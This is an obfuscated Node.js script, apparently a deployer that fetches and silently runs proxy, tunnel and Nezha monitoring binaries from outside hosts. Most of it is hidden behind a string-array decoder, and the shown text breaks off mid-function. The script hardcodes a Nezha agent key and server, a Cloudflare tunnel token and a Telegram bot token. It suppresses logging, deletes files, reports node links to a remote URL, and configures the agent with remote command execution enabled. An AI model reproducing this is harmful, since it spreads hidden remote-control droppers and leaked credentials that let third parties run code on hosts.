#!/usr/bin/env node

const _0x2a1a64 = _0x4856
function _0x4856(_0x302f0b, _0x2ecfb5) {
  const _0x7f7cfb = _0x7f7c()
  return (
    (_0x4856 = function (_0x4856ae, _0x49bc34) {
      _0x4856ae = _0x4856ae - 0x143
      let _0x2e11e4 = _0x7f7cfb[_0x4856ae]
      return _0x2e11e4
    }),
    _0x4856(_0x302f0b, _0x2ecfb5)
  )
}
;(function (_0x5a6447, _0x3be683) {
  const _0x53d489 = _0x4856,
    _0x3b41e8 = _0x5a6447()
  while (!![]) {
    try {
      const _0x186899 =
        parseInt(_0x53d489(0x195)) / 0x1 +
        (-parseInt(_0x53d489(0x176)) / 0x2) * (-parseInt(_0x53d489(0x14b)) / 0x3) +
        parseInt(_0x53d489(0x230)) / 0x4 +
        -parseInt(_0x53d489(0x161)) / 0x5 +
        parseInt(_0x53d489(0x1a6)) / 0x6 +
        parseInt(_0x53d489(0x23c)) / 0x7 +
        -parseInt(_0x53d489(0x20a)) / 0x8
      if (_0x186899 === _0x3be683) break
      else _0x3b41e8['push'](_0x3b41e8['shift']())
    } catch (_0x592a88) {
      _0x3b41e8['push'](_0x3b41e8['shift']())
    }
  }
})(_0x7f7c, 0xcdf50)
const http = require(_0x2a1a64(0x245)),
  axios = require(_0x2a1a64(0x202)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x2a1a64(0x1cb)),
  crypto = require('crypto'),
  { promisify } = require(_0x2a1a64(0x25d)),
  { exec: execCommand, execSync } = require(_0x2a1a64(0x233)),
  exec = promisify(execCommand),
  UPLOAD_URL = process[_0x2a1a64(0x249)][_0x2a1a64(0x223)] || '',
  PROJECT_URL = process[_0x2a1a64(0x249)][_0x2a1a64(0x1d2)] || '',
  AUTO_ACCESS = process[_0x2a1a64(0x249)][_0x2a1a64(0x254)] || ![],
  FILE_PATH = process['env'][_0x2a1a64(0x228)] || _0x2a1a64(0x1db),
  NEZHA_SERVER = process[_0x2a1a64(0x249)]['NEZHA_SERVER'] || _0x2a1a64(0x16e),
  NEZHA_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x15a)] || '',
  NEZHA_KEY = process[_0x2a1a64(0x249)][_0x2a1a64(0x20b)] || 'gEzWhb3icySbZsNrdVsWSgOF9q6x4L8B',
  UUID = process[_0x2a1a64(0x249)]['UUID'] || _0x2a1a64(0x18a),
  ARGO_AUTH =
    process[_0x2a1a64(0x249)][_0x2a1a64(0x1f8)] ||
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
  ARGO_DOMAIN = process[_0x2a1a64(0x249)]['ARGO_DOMAIN'] || _0x2a1a64(0x1da),
  ARGO_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x149)] || 0xe2e1,
  SUB_PATH = process[_0x2a1a64(0x249)][_0x2a1a64(0x210)] || '800',
  PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x20f)] || process[_0x2a1a64(0x249)][_0x2a1a64(0x15d)] || 0xbb8,
  S5_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x1f2)] || '',
  HY2_PORT = process['env'][_0x2a1a64(0x23f)] || '',
  REALITY_PORT = process['env'][_0x2a1a64(0x1f3)] || '',
  NAME = process[_0x2a1a64(0x249)][_0x2a1a64(0x193)] || _0x2a1a64(0x261),
  CFIP = process['env'][_0x2a1a64(0x1a2)] || _0x2a1a64(0x235),
  CFPORT = process['env'][_0x2a1a64(0x18f)] || 0x1bb,
  CHAT_ID = process[_0x2a1a64(0x249)]['CHAT_ID'] || _0x2a1a64(0x255),
  BOT_TOKEN = process[_0x2a1a64(0x249)][_0x2a1a64(0x19c)] || _0x2a1a64(0x188),
  SHOW_LOG = ![_0x2a1a64(0x24d), _0x2a1a64(0x192), 'no'][_0x2a1a64(0x18c)]((process['env']['SHOW_LOG'] || _0x2a1a64(0x24d))[_0x2a1a64(0x17e)]())
!SHOW_LOG && ((console[_0x2a1a64(0x189)] = () => {}), (console[_0x2a1a64(0x1ef)] = () => {}))
function alwaysLog(_0x2e69e2) {
  const _0x9655d3 = _0x2a1a64
  process['stdout'][_0x9655d3(0x204)](_0x2e69e2 + '\x0a')
}
if (!fs['existsSync'](FILE_PATH)) fs['mkdirSync'](FILE_PATH)
else {
}
function isValidPort(_0x5ed076) {
  const _0x239898 = _0x2a1a64
  try {
    if (_0x5ed076 === null || _0x5ed076 === undefined || _0x5ed076 === '') return ![]
    if (typeof _0x5ed076 === _0x239898(0x153) && _0x5ed076['trim']() === '') return ![]
    const _0x56f68c = parseInt(_0x5ed076)
    if (isNaN(_0x56f68c)) return ![]
    if (_0x56f68c < 0x1 || _0x56f68c > 0xffff) return ![]
    return !![]
  } catch (_0x1ffe51) {
    return ![]
  }
}
function generateRandomName() {
  const _0x316e45 = _0x2a1a64,
    _0xf317c8 = _0x316e45(0x218)
  let _0x1aad02 = ''
  for (let _0x459bb9 = 0x0; _0x459bb9 < 0x6; _0x459bb9++) {
    _0x1aad02 += _0xf317c8[_0x316e45(0x224)](Math[_0x316e45(0x14e)](Math['random']() * _0xf317c8[_0x316e45(0x1e8)]))
  }
  return _0x1aad02
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path['join'](FILE_PATH, npmName),
  phpPath = path[_0x2a1a64(0x157)](FILE_PATH, phpName),
  webPath = path['join'](FILE_PATH, webName),
  botPath = path[_0x2a1a64(0x157)](FILE_PATH, botName),
  subPath = path[_0x2a1a64(0x157)](FILE_PATH, 'sub.txt'),
  listPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x243)),
  bootLogPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x1c5)),
  configPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x1e5)),
  certPath = path[_0x2a1a64(0x20c)](FILE_PATH, 'cert.pem'),
  keyPath = path[_0x2a1a64(0x20c)](FILE_PATH, _0x2a1a64(0x19f))
function deleteNodes() {
  const _0x168519 = _0x2a1a64
  try {
    if (!UPLOAD_URL) return
    if (!fs['existsSync'](subPath)) return
    let _0xc4844
    try {
      _0xc4844 = fs['readFileSync'](subPath, 'utf-8')
    } catch {
      return null
    }
    const _0x2fa820 = Buffer['from'](_0xc4844, _0x168519(0x23e))['toString']('utf-8'),
      _0x4e9bb9 = _0x2fa820[_0x168519(0x183)]('\x0a')[_0x168519(0x1ba)]((_0x470839) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x168519(0x1df)](_0x470839)
      )
    if (_0x4e9bb9[_0x168519(0x1e8)] === 0x0) return
    return (
      axios[_0x168519(0x1b6)](UPLOAD_URL + _0x168519(0x1e0), JSON[_0x168519(0x217)]({ nodes: _0x4e9bb9 }), {
        headers: { 'Content-Type': 'application/json' }
      })[_0x168519(0x17d)]((_0x36f321) => {
        return null
      }),
      null
    )
  } catch (_0x432e8b) {
    return null
  }
}
function cleanupOldFiles() {
  const _0xb2cbcd = _0x2a1a64
  try {
    const _0x179161 = fs[_0xb2cbcd(0x1b8)](FILE_PATH)
    _0x179161[_0xb2cbcd(0x237)]((_0x9def84) => {
      const _0x2795f8 = _0xb2cbcd,
        _0x4e1c1d = path['join'](FILE_PATH, _0x9def84)
      try {
        const _0x277480 = fs[_0x2795f8(0x229)](_0x4e1c1d)
        _0x277480[_0x2795f8(0x1cd)]() && fs[_0x2795f8(0x226)](_0x4e1c1d)
      } catch (_0x2d4b04) {}
    })
  } catch (_0x563bf0) {}
}
function generateX25519Keypair() {
  const _0x465efa = _0x2a1a64,
    { publicKey: _0x42c41b, privateKey: _0x4ae9e7 } = crypto['generateKeyPairSync'](_0x465efa(0x258)),
    _0x2c9d68 = _0x4ae9e7[_0x465efa(0x1a8)]({ type: _0x465efa(0x236), format: _0x465efa(0x18d) })[_0x465efa(0x206)](-0x20),
    _0x5b6b9b = _0x42c41b[_0x465efa(0x1a8)]({ type: _0x465efa(0x182), format: _0x465efa(0x18d) })['subarray'](-0x20)
  return { privateKey: _0x2c9d68[_0x465efa(0x21d)]('base64url'), publicKey: _0x5b6b9b[_0x465efa(0x21d)](_0x465efa(0x203)) }
}
function generateOrLoadKeyPair() {
  const _0x3cf2fa = _0x2a1a64,
    _0x3dd93c = path[_0x3cf2fa(0x157)](FILE_PATH, _0x3cf2fa(0x214))
  if (fs['existsSync'](_0x3dd93c)) {
    const _0x361072 = fs['readFileSync'](_0x3dd93c, _0x3cf2fa(0x168)),
      _0x4e5ae9 = _0x361072['match'](/PrivateKey:\s*(.*)/),
      _0x5087a2 = _0x361072[_0x3cf2fa(0x22c)](/PublicKey:\s*(.*)/)
    if (_0x4e5ae9 && _0x5087a2) {
      ;((privateKey = _0x4e5ae9[0x1][_0x3cf2fa(0x240)]()),
        (publicKey = _0x5087a2[0x1]['trim']()),
        console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1b1), privateKey),
        console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1c4), publicKey))
      return
    }
  }
  const _0x2c32c3 = generateX25519Keypair()
  ;((privateKey = _0x2c32c3[_0x3cf2fa(0x219)]),
    (publicKey = _0x2c32c3[_0x3cf2fa(0x216)]),
    fs[_0x3cf2fa(0x16a)](_0x3dd93c, _0x3cf2fa(0x1f5) + privateKey + _0x3cf2fa(0x16f) + publicKey + '\x0a', _0x3cf2fa(0x168)),
    console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1b1), privateKey),
    console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1c4), publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x2a1a64(0x246) +
    _0x2a1a64(0x241) +
    _0x2a1a64(0x1a7) +
    _0x2a1a64(0x152) +
    _0x2a1a64(0x22d) +
    _0x2a1a64(0x1bd) +
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
  FALLBACK_CERT =
    _0x2a1a64(0x1ad) +
    _0x2a1a64(0x177) +
    _0x2a1a64(0x1fe) +
    _0x2a1a64(0x257) +
    _0x2a1a64(0x178) +
    _0x2a1a64(0x1fc) +
    _0x2a1a64(0x16d) +
    _0x2a1a64(0x1fb) +
    _0x2a1a64(0x1ec) +
    _0x2a1a64(0x1d1)
function ensureTlsCertificates(_0x197e8d, _0x48b839) {
  const _0x7c2fcb = _0x2a1a64
  if (fs[_0x7c2fcb(0x201)](_0x197e8d) && fs[_0x7c2fcb(0x201)](_0x48b839)) return
  fs[_0x7c2fcb(0x1b0)](path[_0x7c2fcb(0x197)](_0x197e8d), { recursive: !![] })
  try {
    ;(execSync('openssl\x20version', { stdio: _0x7c2fcb(0x25f) }),
      execSync(_0x7c2fcb(0x15e) + _0x48b839 + '\x22', { stdio: 'ignore' }),
      execSync(_0x7c2fcb(0x1ce) + _0x48b839 + _0x7c2fcb(0x20d) + _0x197e8d + _0x7c2fcb(0x1be), { stdio: _0x7c2fcb(0x25f) }))
    return
  } catch (_0xbccac0) {}
  ;(fs['writeFileSync'](_0x48b839, FALLBACK_EC_KEY), fs[_0x7c2fcb(0x16a)](_0x197e8d, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x2a8167) {
  const _0x1c2c3d = _0x2a1a64
  try {
    const _0x59da72 = execSync(_0x1c2c3d(0x247) + _0x2a8167 + '\x22', { encoding: _0x1c2c3d(0x168), timeout: 0xbb8 })[_0x1c2c3d(0x240)](),
      _0x5c753f = _0x59da72[_0x1c2c3d(0x22c)](/=(.+)$/)
    if (_0x5c753f && _0x5c753f[0x1]) return _0x5c753f[0x1][_0x1c2c3d(0x1c8)]()
  } catch (_0x5972d3) {}
  try {
    const _0x382860 = fs[_0x1c2c3d(0x21e)](_0x2a8167, _0x1c2c3d(0x168)),
      _0x325117 = _0x382860[_0x1c2c3d(0x22c)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x325117) return ''
    const _0x3c7ade = _0x325117[0x1][_0x1c2c3d(0x173)](/\s/g, ''),
      _0x98cc8d = Buffer[_0x1c2c3d(0x163)](_0x3c7ade, _0x1c2c3d(0x23e)),
      _0x10b774 = crypto[_0x1c2c3d(0x147)](_0x1c2c3d(0x25b))['update'](_0x98cc8d)['digest'](_0x1c2c3d(0x143))
    return _0x10b774[_0x1c2c3d(0x22c)](/.{2}/g)['join'](':')[_0x1c2c3d(0x1c8)]()
  } catch (_0x92aeea) {
    return (console['error']('Failed\x20to\x20calculate\x20certificate\x20fingerprint:', _0x92aeea), '')
  }
}
function _0x7f7c() {
  const _0x139c4b = [
    '.npm',
    '\x22\x20run',
    'isp',
    'blackhole',
    'test',
    '/api/delete-nodes',
    'http://ipv6.ip.sb',
    'chmodSync',
    '\x0asocks://',
    'slice',
    'config.json',
    '?security=tls&sni=',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'length',
    'vless-in',
    'tcp',
    '/sendMessage',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    '节点推送**\x0a```',
    'error',
    '&pinSHA256=',
    'Error\x20reading\x20boot.log:',
    'S5_PORT',
    'REALITY_PORT',
    '\x20failed:\x20',
    'PrivateKey:\x20',
    'Nodes\x20uploaded\x20successfully',
    'direct',
    'ARGO_AUTH',
    'unlink',
    'quic',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '2096',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    '\x20in\x20clouudflare',
    '/trojan-argo',
    'existsSync',
    'axios',
    'base64url',
    'write',
    'https://arm64.oooen.com',
    'subarray',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    's5-in',
    'get',
    '7214392ylSBzX',
    'NEZHA_KEY',
    'resolve',
    '\x22\x20-out\x20\x22',
    'https://api.ip.sb/geoip',
    'SERVER_PORT',
    'SUB_PATH',
    '/v1',
    'https://amd64.ssss.nyc.mn',
    'php\x20running\x20error:\x20',
    'key.txt',
    '/bot',
    'publicKey',
    'stringify',
    'abcdefghijklmnopqrstuvwxyz',
    'privateKey',
    'password',
    '\x20is\x20running',
    'none',
    'toString',
    'readFileSync',
    'pkill\x20-f\x20\x22[',
    'config.yaml',
    'success',
    'message',
    'UPLOAD_URL',
    'charAt',
    'Not\x20Found',
    'unlinkSync',
    'Telegram\x20message\x20sent\x20successfully',
    'FILE_PATH',
    'statSync',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    '\x0a\x0atrojan://',
    'match',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'win32',
    'Download\x20',
    '2450120XuzZwG',
    'renameSync',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'child_process',
    'Error\x20executing\x20command:\x20',
    'mfa.gov.ua',
    'pkcs8',
    'forEach',
    'reality',
    'hysteria',
    'web\x20running\x20error:\x20',
    '--tls',
    '3706346MijaJJ',
    'Unknown',
    'base64',
    'HY2_PORT',
    'trim',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'application/json',
    'list.txt',
    'TunnelSecret',
    'http',
    'BggqhkjOPQMBBw==\x0a',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'App\x20is\x20running',
    'env',
    'response',
    '\x20from\x20backup\x20source',
    '\x20-c\x20',
    'false',
    'clear',
    'substring',
    'Mozilla/5.0',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'Unhandled\x20error\x20in\x20startserver:',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'AUTO_ACCESS',
    '7575949494',
    'createWriteStream',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    'x25519',
    'https+local://8.8.8.8/dns-query',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'sha256',
    'readFile',
    'util',
    '\x0avless://',
    'ignore',
    '/agent',
    'js-node',
    'status',
    'hex',
    'socks',
    'nohup\x20\x22',
    'all',
    'createHash',
    'aarch64',
    'ARGO_PORT',
    '.download',
    '3xKNDzy',
    '443',
    'utf-8',
    'floor',
    'url',
    '.exe\x20>\x20nul\x202>&1',
    'https://oooo.serv00.net/add-url',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'string',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    '8443',
    'fileUrls',
    'join',
    'fileName',
    'http://ip-api.com/json',
    'NEZHA_PORT',
    'basename',
    'auto',
    'PORT',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    '/api/add-subscriptions',
    'www.iij.ad.jp:443',
    '3520975VycXNe',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'from',
    'inbounds',
    '2087',
    'hysteria-in',
    '\x0a\x20\x20\x20\x20',
    'utf8',
    'pop',
    'writeFileSync',
    'org',
    'Empowerment\x20failed\x20for\x20',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'nezha.933993.xyz:8443',
    '\x0aPublicKey:\x20',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'www.iij.ad.jp',
    'freedom',
    'replace',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    '\x20>/dev/null\x202>&1\x20&',
    '1449194zdkEHx',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'tls',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'true',
    '/sub.txt\x20saved\x20successfully',
    'catch',
    'toLowerCase',
    '\x0aclient_secret:\x20',
    '/vmess-argo',
    '\x20-c\x20\x22',
    'spki',
    'split',
    'Failed\x20to\x20get\x20IP\x20address:',
    'pipe',
    'Error\x20downloading\x20files:',
    'vless',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    'log',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'del\x20/f\x20/q\x20',
    'includes',
    'der',
    'countryCode',
    'CFPORT',
    'unshift',
    'now',
    'disable',
    'NAME',
    '\x22\x20>\x20/dev/null\x202>&1',
    '24763mSjoRW',
    'proxy',
    'dirname',
    '\x20>/dev/null\x202>&1',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'text/html;\x20charset=utf-8',
    'amd',
    'BOT_TOKEN',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'private.key',
    'push',
    'block',
    'CFIP',
    'arm',
    '/web',
    '127.0.0.1',
    '3349356dhrHzd',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'export',
    'tunnel.yml',
    '2053',
    'npm\x20running\x20error:\x20',
    'trojan-ws-in',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'close',
    'xtls-rprx-vision',
    'mkdirSync',
    'Private\x20Key:',
    '/api/add-nodes',
    'map',
    'http://ipv4.ip.sb',
    'vmess',
    'post',
    'taskkill\x20/f\x20/im\x20',
    'readdirSync',
    '\x20successfully',
    'filter',
    'vless-tcp-in',
    'tunnel.json',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'index.html',
    'automatic\x20access\x20task\x20added\x20successfully',
    'country_code',
    'end',
    'MarkdownV2',
    'Public\x20Key:',
    'boot.log',
    '/vmess-argo?ed=2560',
    'http\x20server\x20is\x20running\x20on\x20',
    'toUpperCase',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'data',
    'path',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'isFile',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    '/vless-argo',
    '-----END\x20CERTIFICATE-----\x0a',
    'PROJECT_URL',
    '\x20>\x20nul\x202>&1',
    'vless-fallback-in',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'writeHead',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'text/plain;\x20charset=utf-8',
    '\x20-s\x20',
    'deployzy.933993.xyz'
  ]
  _0x7f7c = function () {
    return _0x139c4b
  }
  return _0x7f7c()
}
async function generateConfig() {
  const _0x483542 = _0x2a1a64,
    _0x8d92e7 = {
      log: { access: '/dev/null', error: '/dev/null', loglevel: _0x483542(0x21c) },
      inbounds: [
        {
          tag: _0x483542(0x1d4),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x483542(0x187),
          settings: {
            clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
            decryption: 'none',
            fallbacks: [
              { dest: 0xbb9 },
              { path: '/vless-argo', dest: 0xbba },
              { path: '/vmess-argo', dest: 0xbbb },
              { path: _0x483542(0x200), dest: 0xbbc }
            ]
          },
          streamSettings: { network: 'tcp' }
        },
        {
          tag: _0x483542(0x1bb),
          port: 0xbb9,
          listen: _0x483542(0x1a5),
          protocol: _0x483542(0x187),
          settings: { clients: [{ id: UUID }], decryption: 'none' },
          streamSettings: { network: _0x483542(0x1ea), security: _0x483542(0x21c) }
        },
        {
          tag: 'vless-ws-in',
          port: 0xbba,
          listen: _0x483542(0x1a5),
          protocol: _0x483542(0x187),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x483542(0x21c) },
          streamSettings: { network: 'ws', security: _0x483542(0x21c), wsSettings: { path: _0x483542(0x1d0) } },
          sniffing: { enabled: !![], destOverride: [_0x483542(0x245), _0x483542(0x179), _0x483542(0x1fa)], metadataOnly: ![] }
        },
        {
          tag: 'vmess-ws-in',
          port: 0xbbb,
          listen: _0x483542(0x1a5),
          protocol: _0x483542(0x1b5),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x483542(0x180) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x483542(0x179), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x483542(0x1ac),
          port: 0xbbc,
          listen: _0x483542(0x1a5),
          protocol: 'trojan',
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x483542(0x21c), wsSettings: { path: _0x483542(0x200) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x483542(0x179), _0x483542(0x1fa)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x483542(0x259)] },
      outbounds: [
        { protocol: _0x483542(0x172), tag: _0x483542(0x1f7) },
        { protocol: _0x483542(0x1de), tag: _0x483542(0x1a1) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x8d92e7['inbounds'][_0x483542(0x1a0)]({
      tag: _0x483542(0x1e9),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x483542(0x187),
      settings: { clients: [{ id: UUID, flow: _0x483542(0x1af) }], decryption: _0x483542(0x21c) },
      streamSettings: {
        network: 'raw',
        security: _0x483542(0x238),
        realitySettings: { show: ![], dest: _0x483542(0x160), xver: 0x0, serverNames: [_0x483542(0x171)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x8d92e7[_0x483542(0x164)][_0x483542(0x1a0)]({
        tag: _0x483542(0x166),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x483542(0x239),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x483542(0x239),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x483542(0x196), url: 'https://bing.com' } },
          security: _0x483542(0x179),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x8d92e7['inbounds'][_0x483542(0x1a0)]({
        tag: _0x483542(0x208),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x483542(0x144),
        settings: { auth: _0x483542(0x21a), accounts: [{ user: UUID[_0x483542(0x24f)](0x0, 0x8), pass: UUID[_0x483542(0x1e4)](-0xc) }], udp: !![] }
      }),
    fs[_0x483542(0x16a)](path[_0x483542(0x157)](FILE_PATH, _0x483542(0x1e5)), JSON['stringify'](_0x8d92e7, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x3cf4a0 = _0x2a1a64,
    _0x516858 = os['arch']()
  return _0x516858 === _0x3cf4a0(0x1a3) || _0x516858 === 'arm64' || _0x516858 === _0x3cf4a0(0x148) ? _0x3cf4a0(0x1a3) : _0x3cf4a0(0x19b)
}
function downloadFile(_0x506b99, _0x365b2c, _0x745aac) {
  const _0xd32148 = _0x2a1a64,
    _0xa7c524 = _0x506b99,
    _0xe0f06 = _0xa7c524 + _0xd32148(0x14a)
  !fs[_0xd32148(0x201)](FILE_PATH) && fs[_0xd32148(0x1b0)](FILE_PATH, { recursive: !![] })
  const _0x5d42dc = fs[_0xd32148(0x256)](_0xe0f06)
  axios({ method: _0xd32148(0x209), url: _0x365b2c, responseType: 'stream' })
    ['then']((_0x5bb066) => {
      const _0x50c51c = _0xd32148
      ;(_0x5bb066[_0x50c51c(0x1ca)][_0x50c51c(0x185)](_0x5d42dc),
        _0x5d42dc['on']('finish', () => {
          const _0x3b02af = _0x50c51c
          _0x5d42dc[_0x3b02af(0x1ae)]((_0x19ff05) => {
            const _0x2770d6 = _0x3b02af
            if (_0x19ff05) {
              const _0x35be8a = _0x2770d6(0x22f) + path['basename'](_0xa7c524) + _0x2770d6(0x1f4) + _0x19ff05[_0x2770d6(0x222)]
              ;(fs[_0x2770d6(0x1f9)](_0xe0f06, () => {}), console[_0x2770d6(0x1ef)](_0x35be8a), _0x745aac(_0x35be8a))
              return
            }
            try {
              fs[_0x2770d6(0x231)](_0xe0f06, _0xa7c524)
            } catch (_0x2307c5) {
              const _0x619afe = _0x2770d6(0x22f) + path[_0x2770d6(0x15b)](_0xa7c524) + _0x2770d6(0x1f4) + _0x2307c5[_0x2770d6(0x222)]
              ;(fs[_0x2770d6(0x1f9)](_0xe0f06, () => {}), console[_0x2770d6(0x1ef)](_0x619afe), _0x745aac(_0x619afe))
              return
            }
            ;(console[_0x2770d6(0x189)](_0x2770d6(0x22f) + path[_0x2770d6(0x15b)](_0xa7c524) + _0x2770d6(0x1b9)), _0x745aac(null, _0xa7c524))
          })
        }),
        _0x5d42dc['on'](_0x50c51c(0x1ef), (_0xedf1d5) => {
          const _0x261a9b = _0x50c51c
          fs[_0x261a9b(0x1f9)](_0xe0f06, () => {})
          const _0x180ccb = _0x261a9b(0x22f) + path[_0x261a9b(0x15b)](_0xa7c524) + _0x261a9b(0x1f4) + _0xedf1d5['message']
          ;(console[_0x261a9b(0x1ef)](_0x180ccb), _0x745aac(_0x180ccb))
        }))
    })
    ['catch']((_0x4404cc) => {
      const _0x1409cc = _0xd32148
      fs[_0x1409cc(0x1f9)](_0xe0f06, () => {})
      const _0x56297e = _0x1409cc(0x22f) + path[_0x1409cc(0x15b)](_0xa7c524) + _0x1409cc(0x1f4) + _0x4404cc[_0x1409cc(0x222)]
      ;(console['error'](_0x56297e), _0x745aac(_0x56297e))
    })
}
async function downloadFilesAndRun() {
  const _0x57e4a6 = _0x2a1a64,
    _0x5c1906 = getSystemArchitecture(),
    _0x3924d1 = getFilesForArchitecture(_0x5c1906)
  if (_0x3924d1[_0x57e4a6(0x1e8)] === 0x0) {
    console['log'](_0x57e4a6(0x17a))
    return
  }
  const _0x41825e = _0x3924d1[_0x57e4a6(0x1b3)]((_0x5e9eb9) => {
    return new Promise((_0x4604d0, _0xde7ccc) => {
      const _0xc2e3c1 = (_0xa0f7df) => {
        downloadFile(_0x5e9eb9['fileName'], _0x5e9eb9['fileUrls'][_0xa0f7df], (_0x4e398d, _0x19779e) => {
          const _0x279e15 = _0x4856
          if (!_0x4e398d) {
